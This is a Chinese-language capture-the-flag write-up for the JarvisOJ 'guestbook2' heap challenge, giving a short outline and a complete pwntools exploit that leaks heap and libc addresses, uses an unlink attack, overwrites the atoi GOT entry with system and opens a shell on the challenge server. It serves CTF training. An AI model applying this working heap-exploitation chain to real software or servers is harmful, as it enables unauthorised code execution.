# JarvisOJ Guestbook2

### 0x1 分析

这道题和level6_x64一模一样。这里只说下思路。具体的做法在[这里](https://github.com/teamchive/chive/blob/dev/team/Meng-YC/JarvisOJ-level6-x64/Jarvis-level6-x64.md)有详解。

1. 首先通过`list`函数来泄露`heapbase`地址。
2. 然后Unlink让我们可以修改任意地址。
3. 再泄露`libc`地址获得`system`地址。
4. 最后覆盖`atoi`的GOT完成。

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug' 
context.terminal = ['tmux', 'splitw', '-h']
p = remote("pwn.jarvisoj.com", 9879)
# p = process('./guestbook2')
elf = ELF("./guestbook2")
libc = ELF("./libc.so.6")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

system_libc = libc.symbols["system"]

def debug(p, cmd):
  '''cmd = 'b *%d' %(proc_base+breakaddr)'''
  gdb.attach(p, cmd)
  pause()

def create(p, content):
  p.sendlineafter("Your choice: ", "2")
  p.sendlineafter("Length of new post: ", str(len(content)))
  p.sendafter("Enter your post: ", content)

def list(p):
  p.sendlineafter("Your choice: ", "1")

def edit(p, idx, content):
  p.sendlineafter("Your choice: ", "3")
  p.sendlineafter("Post number: ", str(idx))
  p.sendlineafter("Length of post: ", str(len(content)))
  p.sendafter("Enter your post: ", content)

def delete(p, idx):
  p.sendlineafter("Your choice: ", "4")  
  p.sendlineafter("Post number: ", str(idx))

#leak heapbase
create(p, 'A' * 0x80)         #idx:0
create(p, 'A' * 0x80)         #idx:1
create(p, 'A' * 0x80)         #idx:2
create(p, 'A' * 0x80)         #idx:3
create(p, 'A' * 0x80)         #idx:4

delete(p, 3)
delete(p, 1)

payload = 'A'*0x80 + 'a'*0x10
edit(p, 0, payload)
list(p)
p.recvuntil('a' * 0x10)
heap_base = u64(p.recvuntil("\x0a", drop = True).ljust(8, '\x00')) - 0x1810 - 0x90 * 3 - 0x10
chunk0_addr = heap_base + 0x30
chunk1_addr = heap_base + 0x10 + 0x1810 + 0x90 * 1 + 0x10

payload = p64(0x90) + p64(0x80) + p64(chunk0_addr - 0x18) + p64(chunk0_addr - 0x10)
payload = payload + 'a' * (0x80 - 0x8 * 4) + p64(0x80) + p64(0x90)
payload = payload.ljust(0x100, 'p')

edit(p, 0, payload)
delete(p, 1)

payload = p64(2) + p64(1) + p64(0x100) + p64(chunk0_addr - 0x18)
payload = payload + p64(1) + p64(0x8) + p64(elf.got["atoi"])
payload = payload.ljust(0x100, '\x00')
edit(p, 0, payload)
list(p)
p.recvuntil("0. ")
p.recvuntil("1. ")
libc_Base = u64(p.recvuntil("\x0a", drop = True).ljust(8, '\x00')) - libc.symbols["atoi"]
system_addr = libc_Base + system_libc

edit(p, 1, p64(system_addr))
p.sendlineafter("Your choice: ", "/bin/sh\x00") 

p.interactive()
```

